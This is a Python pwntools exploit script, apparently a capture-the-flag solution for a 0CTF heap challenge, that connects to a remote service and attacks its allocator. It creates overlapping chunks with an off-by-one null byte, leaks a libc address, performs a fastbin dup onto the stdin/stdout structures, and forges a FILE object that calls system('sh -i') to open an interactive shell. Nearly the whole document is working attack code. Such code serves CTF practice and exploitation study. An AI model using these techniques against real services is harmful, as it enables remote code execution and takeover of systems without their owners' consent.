from pwn import *

local = False

if local:
	HOST, PORT = '192.168.199.141', 6500
else:
	HOST, PORT = '202.120.7.218', 2017
libc = ELF('/=/Downloads/0ctflibc.so.6')
r = remote(HOST, PORT)

menu = lambda: r.recvuntil('Command: ')
go = lambda x: r.sendline(str(x))

heapmap = {}
def add(size):
	menu()
	go(1)
	r.recvuntil('Size: ')
	go(size)
	r.recvuntil('Index ')
	index = int(r.recvline()[:-1])
	print 'added', index, hex(size)
	heapmap[index] = size
	return index

def fill(index, content):
	menu()
	go(2)
	r.recvuntil('Index: ')
	go(index)
	r.recvuntil('Size: ')
	go(len(content))
	r.recvuntil('Content: ')
	r.send(content)

def free(index):
	menu()
	go(3)
	r.recvuntil('Index: ')
	go(index)
	print 'freed', index

def dump(index):
	menu()
	go(4)
	r.recvuntil('Index: ')
	go(index)
	r.recvuntil('Content: \n')
	return r.recvn(heapmap[index])

def overlap(size=0x110+0x70):
	global a, b, c, b1, b2
	a = add(0x100)
	b = add(0x200)
	c = add(0x100)
	free(b)
	fill(a, 'a' * 0x108 + '\x00')
	b1 = add(0x100)
	b2 = add(0x80)
	free(b1)
	free(c)
	d = add(size) # d and b2 overlap. d + 0x110 = b.
	return d

d = overlap()

heap = 'a' * 0x100 + p64(0) + p64(0x91)
fill(d, heap)
# overlapping chunk, and free smallbin.
# effects:
# 1. b2[0], b2[1] points av->top, which means memory leak with d.
# 2. it's "freed". unsorted bin attack is possible! :)
# other attack can be possible I think, but I don't mind.
free(b2)
data = dump(d)
print hexdump(data)
av_top = u64(data[0x110:0x118])
delta = 5
if local and False:
	libc.address = av_top - 0x3c3b78
	addr_offset = 0x3c4520 + delta - 8
	lock = libc.address + 0x3c5780
else:
	libc.address = av_top - 0x3a5678
	addr_offset = 0x3a6040 + delta - 8
	lock = libc.address + 0x3a77a0

stdout = libc.symbols['_IO_2_1_stdout_']
stdin = libc.symbols['_IO_2_1_stdin_']

print hex(av_top)
print hex(libc.address)
free(d)
free(a)

d = overlap(0x110 + 0x80)

fastbin_size = 0x60
heap = 'a' * 0x100 + p64(0) + p64(fastbin_size + 0x10) + '\x00' * (fastbin_size + 8) + p64(0x2240)
fill(d, heap)
free(b2) # free fastbin chunk
heap = 'a' * 0x100 + p64(0) + p64(fastbin_size + 0x10) + p64(libc.address + addr_offset) # dup into what? I chose stdin/stdout partial pointer.
fill(d, heap)
f1 = add(fastbin_size)
f2 = add(fastbin_size)

filebase = libc.address + addr_offset + 0x20 - delta + 8
obj = 'sh -i '.ljust(16, '\x00') + p64(filebase + 213) * 6 + p64(filebase + 214) + p64(0) * 4 + p64(filebase) + p64(1) + p64(0xffffffffffffffff)
obj += p64(0x0000000009000000) + p64(lock) + p64(0xffffffffffffffff) + p64(0) + p64(filebase + 0xb8) + p64(0) + p64(0) + p64(0) + p64(1) + p64(0) + p64(libc.symbols['system']) + p64(filebase + 0xd0 - 0x18)

payload = '\x00' * (0x18 - delta) + obj
fill(f2, payload)

c1 = add(0x100)
c2 = add(0x100)
fill(c1, 'a' * 0x120)

free(c2) # trigger

if '\n' in obj:
	print 'wtf'
	exit()

r.sendline(obj)

r.interactive()